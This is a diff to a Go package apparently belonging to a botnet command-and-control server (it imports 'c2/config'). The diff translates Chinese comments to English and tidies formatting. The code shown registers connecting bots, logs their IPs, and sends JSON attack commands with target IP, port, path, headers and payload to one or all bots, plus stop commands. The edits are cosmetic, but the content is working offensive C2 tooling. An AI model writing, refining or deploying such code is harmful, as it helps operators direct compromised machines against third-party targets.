@@ -2,18 +2,18 @@ package bot
 
 import (
 	"bufio"
+	"encoding/json"
 	"fmt"
 	"net"
 	"os"
 	"strings"
 	"sync"
 	"time"
-	"encoding/json"
 
 	"c2/config"
 )
 
-// BotInfo 存储关于机器人的信息
+// BotInfo stores information about the bot
 type BotInfo struct {
 	Conn           net.Conn
 	ConnectTime    time.Time
@@ -24,13 +24,13 @@ type BotInfo struct {
 }
 
 var (
-	// Bots 存储所有连接的机器人
-	Bots  = make(map[string]*BotInfo)
-	// BotMu 用于保护Bots的并发访问
+	// Bots stores all connected bots
+	Bots = make(map[string]*BotInfo)
+	// BotMu protects concurrent access to Bots
 	BotMu sync.Mutex
 )
 
-// HandleNewBot 处理新的机器人连接
+// HandleNewBot handles a new bot connection
 func HandleNewBot(conn net.Conn) {
 	botIP := conn.RemoteAddr().(*net.TCPAddr).IP.String()
 	now := time.Now()
@@ -52,7 +52,7 @@ func HandleNewBot(conn net.Conn) {
 	go MonitorBotConnection(bot, botIP)
 }
 
-// MonitorBotConnection 监控机器人连接并处理消息
+// MonitorBotConnection monitors the bot connection and processes messages
 func MonitorBotConnection(bot *BotInfo, botIP string) {
 	defer func() {
 		bot.Conn.Close()
@@ -79,7 +79,7 @@ func MonitorBotConnection(bot *BotInfo, botIP string) {
 	}
 }
 
-// ProcessBotMessage 处理来自机器人的消息
+// ProcessBotMessage processes messages from the bot
 func ProcessBotMessage(bot *BotInfo, msg string) {
 	msg = strings.TrimSpace(msg)
 	switch {
@@ -94,7 +94,7 @@ func ProcessBotMessage(bot *BotInfo, msg string) {
 	}
 }
 
-// LogConnection 将连接记录到日志文件
+// LogConnection logs the connection to a log file
 func LogConnection(ip string) {
 	file, err := os.OpenFile(config.LogFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
 	if err != nil {
@@ -104,7 +104,7 @@ func LogConnection(ip string) {
 	file.WriteString(fmt.Sprintf("[%s] %s\n", time.Now().Format(time.RFC3339), ip))
 }
 
-// SendCommandToBot 向机器人发送命令
+// SendCommandToBot sends a command to a bot
 func SendCommandToBot(bot *BotInfo, command config.BotCommand) bool {
 	jsonCommand, err := json.Marshal(command)
 	if err != nil {
@@ -119,7 +119,7 @@ func SendCommandToBot(bot *BotInfo, command config.BotCommand) bool {
 	return true
 }
 
-// SendBotCommand 向一个或所有机器人发送命令
+// SendBotCommand sends a command to one or all bots
 func SendBotCommand(command config.BotCommand, botIP string) {
 	BotMu.Lock()
 	defer BotMu.Unlock()
@@ -127,7 +127,7 @@ func SendBotCommand(command config.BotCommand, botIP string) {
 	sent := 0
 	if botIP != "" {
 		if bot, exists := Bots[botIP]; exists && bot.Status == "Online" {
-			// 直接发送命令
+			// Send command directly
 			if SendCommandToBot(bot, command) {
 				bot.Status = "Online"
 				bot.CurrentTask = command.Method
@@ -151,7 +151,7 @@ func SendBotCommand(command config.BotCommand, botIP string) {
 	fmt.Printf("\n[+] Successfully sent command to %d bots\n", sent)
 }
 
-// SendStopToAllBots 向所有在线机器人发送停止命令
+// SendStopToAllBots sends a stop command to all online bots
 func SendStopToAllBots() {
 	BotMu.Lock()
 	defer BotMu.Unlock()
@@ -161,8 +161,8 @@ func SendStopToAllBots() {
 		IP:      "",
 		Port:    0,
 		Path:    "",
-		Header:  "", 
-		Payload: "",  
+		Header:  "",
+		Payload: "",
 	}
 
 	sentCount := 0
@@ -175,7 +175,7 @@ func SendStopToAllBots() {
 	fmt.Printf("[+] Sent stop command to %d online bots\n", sentCount)
 }
 
-// SendStopToSpecificBot 向指定的机器人发送停止命令
+// SendStopToSpecificBot sends a stop command to a specific bot
 func SendStopToSpecificBot(ip string) {
 	BotMu.Lock()
 	defer BotMu.Unlock()
@@ -185,8 +185,8 @@ func SendStopToSpecificBot(ip string) {
 		IP:      "",
 		Port:    0,
 		Path:    "",
-		Header:  "", 
-		Payload: "",  
+		Header:  "",
+		Payload: "",
 	}
 
 	if bot, exists := Bots[ip]; exists && bot.Status == "Online" {
